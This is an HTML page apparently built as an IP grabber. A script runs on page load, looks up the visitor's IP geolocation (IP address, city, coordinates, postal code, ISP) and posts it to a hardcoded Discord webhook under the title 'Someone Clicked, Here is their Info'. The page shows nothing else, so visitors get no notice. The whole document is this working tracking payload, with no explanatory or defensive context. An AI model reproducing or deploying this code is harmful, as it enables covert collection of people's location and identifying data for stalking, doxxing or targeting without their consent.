<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Geolocation Webhook</title>
  </head>
  <body>
    <script>
      const whurl = "https://discord.com/api/webhooks/1084656540881002576/RaQY4jj8HLTEDVetKIIUvMIjZ9Bgu6Ys3weqtfpYbqYXK3RegVzwX1Dq-oxAjYzSO7nz";
const ipUrl = "https://ipapi.co/json/";

// Make a request to get the geolocation information
fetch(ipUrl)
  .then(response => response.json())
  .then(data => {
    const {
      ip,
      city,
      region,
      country_name,
      country_code,
      latitude,
      longitude,
      timezone,
      postal,
      asn,
      org
    } = data;

    const msg = {
      "embeds": [
        {
          "title": "Someone Clicked, Here is their Info",
          "color": 16729344,
          "fields": [
            {
              "name": "IP Address",
              "value": ip
            },
            {
              "name": "City",
              "value": city,
              "inline": true
            },
            {
              "name": "Region",
              "value": region,
              "inline": true
            },
            {
              "name": "Country",
              "value": `${country_name} (${country_code})`,
              "inline": true
            },
            {
              "name": "Latitude, Longitude",
              "value": `(${latitude}, ${longitude})`,
              "inline": true
            },
            {
              "name": "Timezone",
              "value": timezone,
              "inline": true
            },
            {
              "name": "Postal Code",
              "value": postal,
              "inline": true
            },
            {
              "name": "ASN",
              "value": asn,
              "inline": true
            },
            {
              "name": "Organization",
              "value": org,
              "inline": true
            }

          ]
        }
      ],
      "username": "Family Dude by Empire4946"
    };

    // Send a webhook message with the geolocation information
    fetch(whurl + "?wait=true", {
      "method": "POST",
      "headers": {"content-type": "application/json"},
      "body": JSON.stringify(msg)
    });
  })
  .catch(error => console.log(error));
    </script>
  </body>
</html>
